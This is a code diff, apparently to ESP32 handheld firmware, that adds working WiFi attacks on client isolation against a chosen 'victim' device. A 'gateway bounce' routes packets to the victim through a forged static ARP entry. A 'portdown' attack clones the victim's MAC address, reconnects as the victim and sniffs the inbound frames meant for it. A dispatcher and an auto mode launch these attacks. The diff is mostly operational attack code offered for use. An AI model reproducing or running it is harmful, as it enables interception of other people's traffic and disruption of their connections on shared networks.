@@ -28,6 +28,7 @@
 #include <lwip/etharp.h>           // read the victim's reply straight from our ARP cache
 #include <lwip/netif.h>
 #include <lwip/tcpip.h>            // LOCK_TCPIP_CORE
+#include <ESP32Ping.h>            // bounce: reach the victim via the gateway at IP layer
 
 extern DisplayManager displayManager;
 extern InputHandling  inputHandler;
@@ -435,21 +436,178 @@ static void isoGwPoison(int idx) {
     dm.clearScreen(); dm.printCommandScreen();
 }
 
+// portdown capture: count data frames whose A1 (dest) == the cloned victim MAC —
+// traffic the AP now hands us because we stole the victim's MAC.
+static volatile bool     s_victimSteal = false;
+static volatile uint32_t s_stealCount  = 0;
+static volatile uint8_t  s_stealMac[6];
+static void isoStealCb(void* buf, wifi_promiscuous_pkt_type_t t) {
+    if (!s_victimSteal || t != WIFI_PKT_DATA) return;
+    wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)buf;
+    if (pk->rx_ctrl.sig_len < 24) return;
+    const uint8_t* f = pk->payload;
+    uint16_t fc = f[0] | (f[1] << 8);
+    if (!((fc >> 9) & 1)) return;                    // FromDS → A1 = destination
+    if (memcmp(f + 4, (const void*)s_stealMac, 6) == 0) s_stealCount++;
+}
+
+// ── gateway MAC resolver (bounce needs it; the gateway is reachable even under
+// isolation, so lwip can ARP it normally). Returns true + fills mac, or false.
+static bool isoResolveGw(uint32_t gwIp, struct eth_addr* mac) {
+    if (!netif_default || !gwIp) return false;
+    ip4_addr_t g; IP4_ADDR(&g, (gwIp >> 24) & 0xff, (gwIp >> 16) & 0xff, (gwIp >> 8) & 0xff, gwIp & 0xff);
+    for (int t = 0; t < 25; t++) {                   // ~2.5s
+        struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
+        LOCK_TCPIP_CORE();
+        etharp_request(netif_default, &g);
+        s8_t hit = etharp_find_addr(netif_default, &g, &er, &ir);
+        UNLOCK_TCPIP_CORE();
+        if (hit >= 0 && er) { *mac = *er; return true; }
+        char k = inputHandler.getKeyboardInput();
+        if (k == 'q' || k == 'Q') return false;
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    return false;
+}
+
+// ── bounce — reach the victim at the IP layer via the gateway ────────────────────
+// Client isolation blocks client↔client at L2, but the gateway routes at L3. We
+// install a static ARP entry (victim IP → gateway MAC) so lwip sends the victim's
+// packets to the gateway, which may hairpin them to the victim. A ping reply =>
+// reachable despite isolation. Static entry removed on every exit.
+static void isoBounce(int idx) {
+    auto& dm = displayManager;
+    isoHeader("gateway bounce");
+    uint32_t victimIp = netspyDeviceIp(idx);
+    if (!victimIp) { dm.setTextColor(TFT_RED); dm.println("Victim has no IP."); dm.printCommandScreen(); return; }
+    IPAddress gw = WiFi.gatewayIP();
+    uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
+    if (!gwIp) { dm.setTextColor(TFT_RED); dm.println("No gateway."); dm.printCommandScreen(); return; }
+
+    char b[48];
+    dm.setTextColor(0x7BEF); dm.println("Resolving gateway MAC...");
+    struct eth_addr gwMac;
+    if (!isoResolveGw(gwIp, &gwMac)) {
+        dm.setTextColor(TFT_RED); dm.println("Can't resolve gateway MAC."); dm.printCommandScreen(); return;
+    }
+    ip4_addr_t vip; IP4_ADDR(&vip, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
+                            (victimIp >> 8) & 0xff, victimIp & 0xff);
+    LOCK_TCPIP_CORE(); etharp_add_static_entry(&vip, &gwMac); UNLOCK_TCPIP_CORE();
+
+    IPAddress vAddr((uint8_t)((victimIp >> 24) & 0xff), (uint8_t)((victimIp >> 16) & 0xff),
+                    (uint8_t)((victimIp >> 8) & 0xff), (uint8_t)(victimIp & 0xff));
+    isoIpStr(victimIp, b, sizeof(b));
+    dm.setTextColor(0x7BEF); dm.printText("Pinging "); dm.printText(b); dm.println(" via gw...");
+    bool ok = Ping.ping(vAddr, 4);                   // blocks ~4s
+    float ms = ok ? Ping.averageTime() : 0.0f;
+
+    LOCK_TCPIP_CORE(); etharp_remove_static_entry(&vip); UNLOCK_TCPIP_CORE();
+
+    dm.println("");
+    if (ok) {
+        dm.setTextColor(TFT_GREEN);
+        snprintf(b, sizeof(b), "BOUNCE OK - reply %.0f ms", ms); dm.println(b);
+        dm.setTextColor(0x6FE8); dm.println("Isolation bypassed at IP layer.");
+    } else {
+        dm.setTextColor(TFT_RED); dm.println("No reply - bounce blocked");
+        dm.setTextColor(0x7BEF); dm.println("(gateway won't hairpin, or victim");
+        dm.println(" drops ICMP)");
+    }
+    dm.printCommandScreen();
+}
+
+// ── portdown — MAC-spoof to steal the victim's INBOUND traffic (downlink) ────────
+// Clone the victim's MAC so the AP's forwarding table maps that MAC to our radio
+// and hands us its incoming frames. DISRUPTIVE: MAC conflict with the real victim,
+// and it drops+reconnects our own WiFi (esp_wifi_set_mac needs the IF stopped,
+// per mac_changer). The original MAC is restored on EVERY exit path (plan's rule).
+static void isoSetStaMac(const uint8_t* mac) {         // mirrors MacChanger::applyMac
+    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
+    esp_wifi_stop();
+    esp_wifi_set_mac(WIFI_IF_STA, (uint8_t*)mac);
+    esp_wifi_start();
+    delay(300);
+}
+static void isoPortDown(int idx) {
+    auto& dm = displayManager;
+    isoHeader("port steal: downlink");
+    uint8_t vic[6];
+    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return; }
+    uint8_t orig[6]; esp_wifi_get_mac(WIFI_IF_STA, orig);
+
+    char b[48];
+    isoMacStr(vic, b, sizeof(b));
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("clone MAC");
+    dm.setTextColor(TFT_CYAN);     dm.setCursor(72, outputY + LINE_HEIGHT * 2); dm.printText(b);
+    dm.setTextColor(TFT_RED);      dm.setCursor(6, outputY + LINE_HEIGHT * 4);
+    dm.printText("Reconnecting as the victim...");
+    dm.setTextColor(0x7BEF);       dm.setCursor(6, outputY + LINE_HEIGHT * 6);
+    dm.printText("Its inbound traffic should now");
+    dm.setCursor(6, outputY + LINE_HEIGHT * 7); dm.printText("route to us (MAC conflict).");
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[q] stop + restore MAC");
+
+    isoSetStaMac(vic);                               // become the victim
+    WiFi.reconnect();
+
+    // Hold the spoof, promiscuous-sniff frames now addressed to the victim MAC.
+    uint32_t rx = 0, lastDraw = 0;
+    s_victimSteal = true; s_stealCount = 0; memcpy((void*)s_stealMac, vic, 6);
+    wifi_promiscuous_filter_t flt = {}; flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
+    esp_wifi_set_promiscuous_filter(&flt);
+    esp_wifi_set_promiscuous_rx_cb(isoStealCb);
+    esp_wifi_set_promiscuous(true);
+    while (true) {
+        char k = inputHandler.getKeyboardInput();
+        if (k == 'q' || k == 'Q') break;
+        rx = s_stealCount;
+        if (!dm.isBlocked() && millis() - lastDraw >= 500) {
+            snprintf(b, sizeof(b), "frames to victim MAC: %lu", (unsigned long)rx);
+            dm.fillRect(0, outputY + LINE_HEIGHT * 9, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
+            dm.setTextColor(rx ? TFT_GREEN : TFT_DARKGREY);
+            dm.setCursor(6, outputY + LINE_HEIGHT * 9); dm.printText(b);
+            lastDraw = millis();
+        }
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    s_victimSteal = false;
+
+    isoSetStaMac(orig);                              // ALWAYS restore our identity
+    WiFi.reconnect();
+    dm.clearScreen(); dm.printCommandScreen();
+}
+
+// ── auto — one-shot reachability sweep ───────────────────────────────────────────
+// inject/portup/portdown are interactive (they hold until q), so 'auto' runs the
+// one-shot, non-destructive bounce probe (IP-layer reachability) and leaves the
+// held attacks to be launched individually from the menu.
+static void isoAuto(int idx) {
+    isoBounce(idx);
+}
+
 // ── attack dispatch ──────────────────────────────────────────────────────────────
 static void isoRunAttack(int idx, IsoAttack attack) {
     auto& dm = displayManager;
-    if (attack == ISO_INJECT) { isoInjectArp(idx); return; }
-    if (attack == ISO_PORTUP) { isoGwPoison(idx);  return; }
-    // TODO(Stage 2): the ARP inject above is the shared TX primitive — RA DNS
-    // poison (swap payload + add UDP-53 DNS logger), gateway-bounce, MAC-spoof
-    // port stealing (save originalMac, restore on EVERY exit path), auto sweep.
-    const IsoAttackInfo* ai = isoAttackInfo(attack);
-    isoHeader(ai ? ai->label : "attack");
-    dm.setTextColor(TFT_YELLOW); dm.println("Target locked, attack confirmed.");
-    dm.setTextColor(0x7BEF);     dm.println("");
-    dm.setTextColor(TFT_WHITE);  dm.println("This core not built yet.");
-    dm.setTextColor(0x7BEF);     dm.println("Try 'inject' — the GTK TX path");
-    dm.setTextColor(0x7BEF);     dm.println("is live (ARP reachability probe).");
+    switch (attack) {
+        case ISO_INJECT:   isoInjectArp(idx); return;
+        case ISO_PORTUP:   isoGwPoison(idx);  return;
+        case ISO_BOUNCE:   isoBounce(idx);    return;
+        case ISO_PORTDOWN: isoPortDown(idx);  return;
+        case ISO_AUTO:     isoAuto(idx);      return;
+        default: break;                       // ISO_BCAST falls through
+    }
+    // bcast: a to-DS broadcast frame would need our PAIRWISE key (PTK) to be
+    // accepted by the AP, which raw 80211_tx can't supply — so it's not separately
+    // injectable. The same "is the victim reachable" question is answered by
+    // 'inject' (GTK broadcast) and 'bounce' (IP layer via gateway).
+    isoHeader("bcast");
+    dm.setTextColor(TFT_YELLOW); dm.println("Not separately injectable:");
+    dm.setTextColor(0x7BEF);     dm.println("a to-DS frame needs our pairwise");
+    dm.println("key (PTK), which raw TX can't add.");
+    dm.println("");
+    dm.setTextColor(TFT_WHITE);  dm.println("Use 'inject' or 'bounce' instead");
+    dm.println("to test victim reachability.");
     dm.printCommandScreen();
 }
 
